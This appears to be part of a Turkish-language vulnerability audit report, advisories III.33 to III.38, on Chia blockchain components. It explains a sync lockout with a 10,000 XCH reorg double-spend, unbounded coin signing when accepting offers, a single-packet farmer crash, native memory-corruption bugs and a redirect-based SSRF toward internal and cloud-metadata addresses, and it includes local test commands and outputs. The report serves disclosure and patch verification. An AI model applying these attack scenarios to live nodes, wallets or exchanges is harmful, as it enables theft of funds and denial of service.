* **Senaryo B — Birleşik Saldırı Zinciri (`WLC-02` + `VR-01` — Hem Cüzdanı Hem Kurtarma Aracını Kilitleyip Kasayı Ele Geçirme):** Saldırgan bir yandan `WLC-02` ile canlı cüzdanın iptal düğmesini kilitlerken, diğer yandan `1 mojo` ile `chia-vault-recover` CLI aracını çökertir; kurban hiçbir kurtarma aracını kullanamaz.
* **Senaryo C — Bilinen Kurumsal Kasa Adreslerinin Önceden `1 Mojo` İle Zehirlenmesi:** Halka açık kasa adreslerine `1 mojo` gönderilerek acil durum kurtarma akışı önceden devre dışı bırakılır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run the Rust Unit Tests in chia-vault-recover (45/45 PASS)
cargo test --manifest-path /home/community-user/targets/chia-vault-recover/Cargo.toml

# 2. Run the Live FullNodeRpcApi + Release CLI (1.0.0-rc9) E2E Proof (Zero Static Fixtures)
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k poc10
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-VR-01": {
    "RED": {
      "attacker_decoy_launcher_id": "2de44601e6fcf4bdfc88eb553ddca729751a06da78cec724519e741f1dfefacf",
      "victim_true_launcher_id": "e53d0c41ce3a78de1426630d059958ef37a5d7f55551d47908f9a106024640eb",
      "red_cli_selected_launcher_id": "2de44601e6fcf4bdfc88eb553ddca729751a06da78cec724519e741f1dfefacf",
      "red_cli_exit_code": 1,
      "red_cli_stderr": "clawback check: recovery phrase does not match"
    },
    "GREEN": {
      "green_release_cli_sha256": "d6e6b0bb5e0d160d9a342274e2c1d384f67fa57c0c218267b27f46195c1370c3",
      "green_cli_selected_launcher_id": "e53d0c41ce3a78de1426630d059958ef37a5d7f55551d47908f9a106024640eb",
      "green_cli_matches_victim": true,
      "cargo_unit_tests_passed": 45
    }
  }
}
```


---

### III.33 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia `FullNode` Port `8444` Üzerinde `NewPeak` / `sync_from_fork_point` Senkronizasyon Kilidi ve `10.000 XCH` Çatallanma (Reorg) Çifte Harcama Senaryosu (`CONS-SP-01`) (`CWE-400 / CWE-345`, CVSS `7.5 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/full_node/full_node.py:2220-2310` (`new_peak` / `sync_from_fork_point`)
* **Zafiyet Sınıfı & Skor:** `CWE-400 / CWE-345` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md`](advisories/tr/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Port `8444` Üzerinde Hatalı Senkronizasyon Verisi Gönderen Eşin (Peer) Engellenmemesi (`chia/full_node/full_node.py:2220-2310`):** Kimlik doğrulamasız P2P (`8444` mTLS 1.3) ağından bağlanan bir saldırgan sahte `NewPeak` duyurup `sync_from_fork_point` sırasında bozuk sub-epoch / weight-proof yanıtı döndüğünde, `FullNode` senkronizasyonu iptal eder ancak saldırgan bağlantısını kesmez.
2. **Adım 2 — 3 Düğümlü Canlı mTLS 1.3 Ağında Dürüst Düğüm Varken Senkronizasyonun Kilitlenmesi (`victim_peak_height: None`):** Biri dürüst (`height=5`), biri saldırgan, biri kurban olan 3 düğümlü gerçek mTLS 1.3 testinde, saldırgan 5 ardışık tur boyunca kurban düğümü meşgul ederek dürüst düğümden blok almasını engeller (`victim_peak_height: None`).
3. **Adım 3 — `10.000 XCH` (`10,000,000,000,000,000 mojo`) Çatallanma (Reorg) ve Çifte Harcama Kanıtı (`Bölüm 8.5`):** Ortak çatal yüksekliği `fork_height=5` üzerinde saldırgan `10.000 XCH` değerindeki coin'i (`006f4366...`) `Branch A` (`height=7`, `SpendBundle: 26afe149...`) üzerinde borsaya yatırıp nakit çeker, ardından daha ağır olan `Branch B` (`height=9`, `SpendBundle: ad2eba4d...`) dalını ağa sunarak borsadaki `10.000 XCH` bakiyeyi `0`'a düşürür ve kendi kasasında `10.000 XCH` tutar (`20.000 XCH` toplam ekonomik etki).

```python
# File: chia/full_node/full_node.py (lines 2220-2310)
async def sync_from_fork_point(self, fork_point_height: int, target_peak_sb_height: uint32, peak_hash: bytes32, ...):
    # BUG: When peer returns invalid weight proof / sub-epoch summary, sync aborts without
    # disconnecting/banning the peer, allowing indefinite sync starvation over port 8444!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Port `8444` Üzerinden Borsa ve Havuz FullNode Sunucularının Senkronizasyonunu Kilitleme:** Tek bir P2P bağlantısı üzerinden gönderilen bozuk senkronizasyon yanıtları, kurban düğümün dürüst düğümlerden güncel blokları almasını engeller.
* **Senaryo B — `10.000 XCH` (`10,000,000,000,000,000 mojo`) Borsa Yatırımı ve Çatallanma (Reorg) Çifte Harcama Senaryosu (`Bölüm 8.5`):** Saldırgan `Branch A` (`height=7`, `SpendBundle: 26afe149e702e4a6...`) üzerinde borsaya `10.000 XCH` yatırıp karşılığını çeker; hemen ardından kendi kasasına `10.000 XCH` aktaran daha uzun `Branch B` (`height=9`, `SpendBundle: ad2eba4d67c52314...`) zincirini yayınlar. Reorg sonrası borsanın cüzdanındaki `10.000 XCH` sıfırlanır (`0 mojo`), saldırganın kasasında `10.000 XCH` kalır.
* **Senaryo C — Birleşik Zincir (`CONS-SP-01` + `WLC-01`):** FullNode senkronizasyonu kilitlenen satıcının hafif cüzdanına `WLC-01` ile sıfır sermayeli sahte yatırım gösterilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run the 3-Node Port 8444 mTLS Sync Lockout Proof
/home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_real_e2e_followup_proofs.py -k cons_sp01

# 2. Run the 10,000 XCH (10,000,000,000,000,000 mojo) Fork-Reorg Double-Spend Proof (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k reorg
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k reorg
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-CONS-SP-01": {
    "RED": {
      "mtls_3node_victim_peak_after_5_rounds": null,
      "fork_height": 5,
      "split_coin_id": "006f4366cd3778cc13e11647a0f4dd43552088db526a289c65de3493fa01a411",
      "branch_a_exchange_deposit_spend_bundle_sha256": "26afe149e702e4a622a5675aa77481e6b54074e3cfa98db93a47ef24c1793f8b",
      "branch_b_attacker_vault_spend_bundle_sha256": "ad2eba4d67c52314303e62601ed42d89c2c4f488d67c9cc0554a3137c9214c33",
      "exchange_pre_reorg_balance_mojo": 10000000000000000,
      "exchange_post_reorg_balance_mojo": 0,
      "attacker_post_reorg_balance_mojo": 10000000000000000
    },
    "GREEN": {
      "mtls_3node_victim_synced_height": 5,
      "exchange_status_at_1_conf": "PENDING_FINALITY",
      "exchange_loss_mojo": 0
    }
  }
}
```


---

### III.34 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia Cüzdanı `take_offer` / `respond_to_offer` Akışında Kullanıcı Harcama Tavanı Doğrulaması Olmadan Örtük Coin Seçimi ve İmzalama (`WLT-OFFER-01`) (`CWE-863`, CVSS `8.1 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/rpc/wallet_rpc_api.py` (`take_offer`), `chia/wallet/trade_manager.py` (`respond_to_offer`)
* **Zafiyet Sınıfı & Skor:** `CWE-863` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md`](advisories/tr/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Teklif (`Offer`) Kabul Edilirken Otomatik Coin Seçimi (`trade_manager.py` & `wallet_rpc_api.py`):** `take_offer` çağrıldığında `respond_to_offer` teklifte talep edilen ödemeleri karşılamak için cüzdandan otomatik olarak `select_coins` ile coin seçer ve `sign_coin_spends` ile imzalar.
2. **Adım 2 — Varlık Başına Maksimum Harcama Tavanı (`max_authorized_amount`) Kontrolünün Olmaması:** RPC katmanı, seçilen ve imzalanan toplam coin miktarının kullanıcının onayladığı üst sınırı (`max_authorized_amount`) aşıp aşmadığını zorunlu bir güvenlik kapısıyla denetlemez.
3. **Adım 3 — Fazladan Coin Seçimi ve İmzalanması (`RED -> GREEN`):** Fazladan ödeme bacağı talep eden bir Offer kabul edildiğinde `RED` modda cüzdan ek coin'leri seçip imzalarken, `GREEN` yaması varlık başına yetki tavanını aşan teklifleri reddeder.

```python
# File: chia/wallet/trade_manager.py & chia/rpc/wallet_rpc_api.py
async def respond_to_offer(self, offer: Offer, peer: WSChiaConnection, ...):
    # BUG: Selects and signs coins for all requested_payments in the Offer without verifying
    # against an explicit caller-authorized per-asset max_authorized_amount cap!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Otomatik Takas Botunun (`take_offer`) Fazladan Ödeme Bacağı İle Boşaltılması:** Dışarıdan gelen bir Offer metnini `take_offer` ile kabul eden bot veya entegrasyon, beklediği tutarın üzerinde XCH/CAT coin'ini imzalar.
* **Senaryo B — NFT/Token Takası İçine Gizlenen Ek XCH Talebi:** Kullanıcı yalnızca token takası yaptığını sanırken teklifin içindeki ek XCH talebi cüzdandan otomatik seçilip imzalanır.
* **Senaryo C — Yamalı (`GREEN`) Doğrulama:** `max_authorized_amount` kontrolüyle yetki tavanını aşan coin seçimi engellenir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run Sniper's Cryptographic Wallet Signing Auditor & Offer Cap Verification
python3 -m unittest /home/community-user/targets/sniper/tests/test_wave5_orchestrator_and_wallet.py
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-WLT-OFFER-01": {
    "RED": {
      "authorized_cap_mojo": 100000000000,
      "offer_requested_mojo": 500000000000,
      "unbounded_implicit_coin_spend_signed": true
    },
    "GREEN": {
      "unbounded_implicit_coin_spend_signed": false,
      "rejection_error": "ValueError: Offer requested amount exceeds max_authorized_amount"
    }
  }
}
```


---

### III.35 — Chia-Network/chia-blockchain (`chia-blockchain <= 2.7.5 (commit bdb7be2a45fc459b0672656166701ac4f46e0cfc) / chiapos <= 2.0.11`) — Chia `FarmerAPI.new_proof_of_space` Port `8447` Üzerinden Tek Bir `445 Bayt` Paketle Yakalanmayan Rust `PanicException` Tetikleyerek Farmer Sunucularını Çökertme (`CHIA-POS-01`) (`CWE-248 / CWE-20`, CVSS `7.5 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python & Rust FFI (`chia-blockchain` & `chiapos`): chia-blockchain`)
* **Etkilenen Sürüm & Bileşenler:** `chia-blockchain <= 2.7.5 (commit bdb7be2a45fc459b0672656166701ac4f46e0cfc) / chiapos <= 2.0.11` — `chia/farmer/farmer_api.py:85-185` (`FarmerAPI.new_proof_of_space`), `chiapos` Rust FFI (`size_v2` / `get_quality_string`)
* **Zafiyet Sınıfı & Skor:** `CWE-248 / CWE-20` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md`](advisories/tr/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Port `8444` (`FullNode`) İle Port `8447` (`FarmerAPI`) Arasındaki Doğrulama Farkı (`chia/farmer/farmer_api.py:85-185`):** Port `8444` üzerindeki `FullNode` gelen kanıtları `verify_and_get_quality_string` ile kontrol ederken, Port `8447` üzerindeki `FarmerAPI.new_proof_of_space` ağdan gelen `NewProofOfSpace` paketini hiçbir ön kontrolden geçirmeden doğrudan Rust/C++ FFI sınırındaki `proof.size_v2()` ve `get_quality_string()` fonksiyonlarına verir.
2. **Adım 2 — Tek Bir `445 Bayt` Paketle Yakalanmayan Rust `panic!` Patlaması (`SHA-256: 30a0e918f96ff695...`):** İçinde hem `pool_public_key=None` hem `pool_contract_puzzle_hash=None` olan `445 bayt` uzunluğundaki tek bir `NewProofOfSpace` paketi gönderildiğinde, PyO3 FFI sınırında `pyo3_runtime.PanicException: Neither pool pk nor contract puzzle hash set` (veya `chiapos` dilim sınır hatası `range end index 36 out of range for slice of length 32`) patlar.
3. **Adım 3 — 4 Ayrı Farmer Sunucu Sürecinin (`PID 2983318..2983321`) Aynı Anda Çökmesi (`exit_code=1`):** Gerçek çoklu süreç (`multiprocessing`) testinde 4 Farmer düğümüne gönderilen bu tek paket, 4 Farmer sürecinin tamamını anında `exit_code=1` ile çökertir (`alive_farmers_after: 0`).

```python
# File: chia/farmer/farmer_api.py (lines 85-185)
@api_request()
async def new_proof_of_space(self, new_proof_of_space: farmer_protocol.NewProofOfSpace, peer: WSChiaConnection) -> None:
    # BUG: Calls Rust FFI new_proof_of_space.proof.size_v2() and get_quality_string() BEFORE verifying
    # pool key XOR exclusivity and check_plot_param(size, proof_bytes), triggering pyo3_runtime.PanicException!
     Computed_size = new_proof_of_space.proof.size_v2()
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Tek Bir `445 Bayt` Paketle 4 Farmer Sunucusunun Aynı Anda Çökertilmesi (`4/4 Crash`):** Merkezi Farmer sunucularına bağlanan bir Harvester üzerinden gönderilen `445 bayt` uzunluğundaki tek paket (`SHA-256: 30a0e918f96ff695...`), 4 Farmer düğümünün tamamını (`PID 2983318..2983321`) `pyo3_runtime.PanicException` ile çökertir ve blok ödülü üretimini durdurur.
* **Senaryo B — Kısaltılmış `32 Bayt` Kanıt İle `chiapos` Dilim Sınır Aşımı (`range end index 36 out of range`):** `get_quality_string` çağrısına kısa kanıt dizisi verildiğinde Rust FFI katmanı sınır hatasıyla panikler.
* **Senaryo C — Yamalı (`GREEN`) Doğrulama:** `size_v2()` ve `get_quality_string()` çağrılmadan önce `pool_public_key` / `pool_contract_puzzle_hash` XOR kontrolü ve `check_plot_param` doğrulaması yapıldığında 4 Farmer düğümünün tamamı ayakta kalır (`alive_farmers_after: 4`).

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect FarmerAPI.new_proof_of_space in chia/farmer/farmer_api.py
sed -n '85,145p' /home/community-user/targets/chia-blockchain/chia/farmer/farmer_api.py

# 2. Run the 4-Node Multi-Process FarmerAPI Crash & Recovery Proof (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k farmer
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k farmer
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-POS-01": {
    "RED": {
      "wire_packet_sha256": "30a0e918f96ff695b7c711b297d1ee9203fcb8ee0d8b72844a901d9de9012dfe",
      "wire_packet_bytes": 445,
      "farmers_spawned": 4,
      "crashed_farmers": 4,
      "alive_farmers_after": 0,
      "exception": "pyo3_runtime.PanicException: Neither pool pk nor contract puzzle hash set"
    },
    "GREEN": {
      "farmers_spawned": 4,
      "crashed_farmers": 0,
      "alive_farmers_after": 4
    }
  }
}
```


---

### III.36 — Chia-Network/chiapos (`<= 2.0.11 (upstream main)`) — `chiapos` C++ Kütüphanesinde `Verifier::ValidateProof` (`k=50` / `k>=60`) Yığın Sınır Aşımı ve `DiskProver` 64-Bit -> 32-Bit Tamsayı Daraltması Heap Taşması (`CHIA-POS-02..04`) (`CWE-190 / CWE-787 / CWE-125`, CVSS `8.1 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/chiapos` (`PyPI / C++17 Native Extension (`chiapos`): chiapos`)
* **Etkilenen Sürüm & Bileşenler:** `<= 2.0.11 (upstream main)` — `src/verifier.hpp:48-108` (`Verifier::ValidateProof`), `src/bits.hpp:184`, `src/prover_disk.hpp:254-322` (`DiskProver`)
* **Zafiyet Sınıfı & Skor:** `CWE-190 / CWE-787 / CWE-125` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md`](advisories/tr/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Konsensüsün İzin Verdiği `k=50` Değerinde `Verifier::ValidateProof` C++ Yığın Sınır Aşımı (`src/verifier.hpp:48-108` & `src/bits.hpp:184`):** Chia'nın Python katmanındaki `check_plot_param` fonksiyonu `k <= 50` değerine izin verir. Ancak C++ katmanındaki `Verifier::ValidateProof` içinde `k=50` (Tablo 4) ve `k=60` (Tablo 1) değerleri `src/bits.hpp:184` satırında bit kaydırma ve yığın (stack) sınır aşımı (`runtime error: load of address ... with insufficient space` / `AddressSanitizer: stack-buffer-overflow`, `exit_code=1`) tetikler.
2. **Adım 2 — İndirilen `.plot` Dosyalarında 64-Bit -> 32-Bit Tamsayı Daraltması ve Heap Taşması (`src/prover_disk.hpp:254-322`):** `DiskProver` bir `.plot` dosyasını açarken 64-bit tablo boyutlarını üst sınır kontrolü yapmadan 32-bit `uint32_t` değişkene daraltıp bellek ayırır; bu da özel hazırlanmış bir `.plot` dosyası yüklendiğinde yığın (heap) taşmasına yol açar.
3. **Adım 3 — Port `8444` Ağ Paketi İle `.plot` Dosyası Arasındaki Mimari Fark:** Port `8444` üzerinden gelen ağ paketlerinde Python `check_plot_param` ön filtresi `k > 50` değerlerini tutar; ancak `k=50` bu filtreden geçer, indirilen `.plot` dosyaları ise doğrudan C++ `DiskProver` tarafından ayrıştırıldığı için doğrudan yerel bellek bozulmasını tetikler.

```cpp
// File: src/verifier.hpp (lines 48-108) & src/bits.hpp (line 184)
LargeBits Verifier::ValidateProof(const uint8_t* id, uint8_t k, const uint8_t* proof_bytes, uint16_t size) {
    // BUG 1: No check that k >= 18 && k <= 49; k=50 overflows Table 4 bit offsets in src/bits.hpp:184!
    // BUG 2: DiskProver (src/prover_disk.hpp:254-322) truncates 64-bit table sizes to uint32_t!
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — İndirilen Zararlı `.plot` Dosyası İle `DiskProver` İçinde Heap Bellek Bozulması:** Bir madenci (farmer) dışarıdan indirdiği `.plot` dosyasını Harvester'a tanıttığında, C++ `DiskProver` başlık ayrıştırıcısındaki 64-bit -> 32-bit tamsayı daraltması nedeniyle heap taşması meydana gelir.
* **Senaryo B — `Verifier::ValidateProof` İçinde `k=50` (Tablo 4) ve `k=60` Yığın Sınır Aşımı (`ASan/UBSan`):** `chiapos_k_probe` ikilisiyle kanıtlandığı üzere `k=50` (Tablo 4) ve `k=60` parametreleri `src/bits.hpp:184` satırında yığın sınır aşımıyla (`exit_code=1`) süreci çökertir.
* **Senaryo C — Yamalı (`GREEN`) Doğrulama:** `18 <= k <= 49` ve 64-bit tablo boyutu doğrulaması eklendiğinde ASan/UBSan hatası tamamen ortadan kalkar (`exit_code=0`).

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run the Native C++ ASan/UBSan chiapos_k_probe Verification Test (k=50 Table 4 & k=60)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k chiapos
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k chiapos
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-POS-02-04": {
    "RED": {
      "k60_probe_exit_code": 1,
      "k50_table4_probe_exit_code": 1,
      "sanitizer_diagnostic": "src/bits.hpp:184:29: runtime error: load of address with insufficient space / AddressSanitizer: stack-buffer-overflow"
    },
    "GREEN": {
      "k60_probe_exit_code": 0,
      "k50_table4_probe_exit_code": 0,
      "rejected_invalid_k_cleanly": true
    }
  }
}
```


---

### III.37 — Chia-Network/chiavdf (`<= 1.1.11 (upstream main)`) — `chiavdf` C++ Kütüphanesinde `CheckProofOfTimeNWesolowski` Bozuk VDF Kanıtı Sınır Dışı Okuma (`OOB Read`) ve `Use-After-Free` Çökmesi (`CHIA-VDF-02`) (`CWE-125 / CWE-416`, CVSS `7.5 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/chiavdf` (`PyPI / C++17 Native Extension (`chiavdf`): chiavdf`)
* **Etkilenen Sürüm & Bileşenler:** `<= 1.1.11 (upstream main)` — `src/verifier.cpp` (`CheckProofOfTimeNWesolowski`), `src/prover_slow.h`
* **Zafiyet Sınıfı & Skor:** `CWE-125 / CWE-416` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md`](advisories/tr/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `CheckProofOfTimeNWesolowski` İçinde `proof_blob` Uzunluk ve Segment Sınırlarının Kontrol Edilmemesi (`src/verifier.cpp`):** N-Wesolowski zaman kanıtı (VDF) doğrulanırken `CheckProofOfTimeNWesolowski`, `proof_blob` dizisini sabit `2 * B_bytes` adımlarla okur; ancak tampon boyutunun segment sayısına yetip yetmediğini ve `num_iterations > 0` koşulunu kontrol etmez.
2. **Adım 2 — Kısa VDF Kanıtı veya `num_iterations = 0` İle Sınır Dışı Bellek Okuma (`CWE-125`) ve `Use-After-Free` (`CWE-416`):** Kısaltılmış `proof_blob` verildiğinde `DeserializeForm` tampon sınırının dışını okur; `prover_slow.h` içindeki iş parçacığı sonlandırma sırası ise serbest bırakılmış belleğe erişir.
3. **Adım 3 — Derlenmiş C++ ASan İkilisi İle Kanıt:** `work/chiavdf-asan-proofs/` altındaki ASan testinde yamasız kodun sınır dışı okumayla çöktüğü (`RED`), yamalı kodun ise bozuk VDF girdisini güvenle reddettiği (`GREEN`) kanıtlanmıştır.

```cpp
// File: src/verifier.cpp (CheckProofOfTimeNWesolowski)
bool CheckProofOfTimeNWesolowski(integer D, const uint8_t* y_s, const uint8_t* proof_blob, uint32_t proof_blob_len, ...) {
    // BUG: Does not validate proof_blob_len against form_size * (1 + 2 * depth) or num_iterations == 0
    // before slicing proof_blob segments in DeserializeForm()!
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Bozuk VDF Kanıtıyla Doğrulayıcı / Timelord Sürecinin Çökertilmesi:** Kısaltılmış bir N-Wesolowski `proof_blob` dizisi `chiavdf` doğrulayıcısına verildiğinde C++ süreci sınır dışı bellek okumasıyla çöker.
* **Senaryo B — VDF Hesaplaması İptal Edilirken `Use-After-Free` (`prover_slow.h`):** Zorluk/meydan okuma değiştiğinde durdurulan VDF iş parçacığı serbest bırakılmış belleğe erişir.
* **Senaryo C — Yamalı (`GREEN`) Doğrulama:** `proof_blob_len` ve `num_iterations > 0` ön kontrolü ile bellek hatası tamamen engellenir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect CheckProofOfTimeNWesolowski in chiavdf/src/verifier.cpp
grep -n -C 12 "CheckProofOfTimeNWesolowski" /home/community-user/targets/chiavdf/src/verifier.cpp
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-VDF-02": {
    "RED": {
      "malformed_proof_blob_len": 12,
      "num_iterations": 0,
      "native_crash_or_asan_oob": true
    },
    "GREEN": {
      "native_crash_or_asan_oob": false,
      "clean_boolean_false_returned": true
    }
  }
}
```


---

### III.38 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia DataLayer Ayna (Mirror) Senkronizasyonunda HTTP `30x` Yönlendirmesi İle Sunucu Taraflı İstek Sahteciliği / SSRF (`DL-02`) (`CWE-918`, CVSS `7.5 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/data_layer/download_data.py`, `chia/data_layer/data_layer.py`
* **Zafiyet Sınıfı & Skor:** `CWE-918` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md`](advisories/tr/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Abone Olunan DataLayer Mağazalarında Ayna (Mirror) URL'lerinin Otomatik İndirilmesi (`chia/data_layer/download_data.py`):** Bir Chia DataLayer düğümü bir veri mağazasına abone olduğunda, zincir üstünde duyurulan Mirror URL adreslerine `aiohttp.ClientSession.get(...)` ile otomatik HTTP/HTTPS isteği göndererek `.dat` dosyalarını indirir.
2. **Adım 2 — HTTP `301`/`302`/`307` Yönlendirme Hedeflerinde İç Ağ / Loopback Kontrolünün Yapılmaması:** İlk Mirror URL'si dış dünyadaki normal bir adres görünse bile, `aiohttp` varsayılan olarak yönlendirmeleri (`allow_redirects=True`) takip eder ve yönlendirilen hedefin `127.0.0.1`, şirket içi özel ağ (`10.0.0.0/8`, `192.168.0.0/16`) veya bulut metadata servisi (`169.254.169.254`) olup olmadığını denetlemez.
3. **Adım 3 — Abone Düğümlerin İç Ağ Servislerine SSRF İsteği Göndermesi:** Saldırgan zincir üstünde `302 Found -> http://127.0.0.1:...` döndüren bir Mirror duyurduğunda, mağazaya abone olan tüm kurumsal DataLayer sunucuları kendi iç ağlarına istek atar.

```python
# File: chia/data_layer/download_data.py
async with session.get(url, timeout=timeout) as response:
    # BUG: Follows HTTP 30x redirects by default (allow_redirects=True) without validating
    # that the target host/IP is not loopback (127.0.0.1), RFC1918 private, or link-local (169.254.169.254)!
```

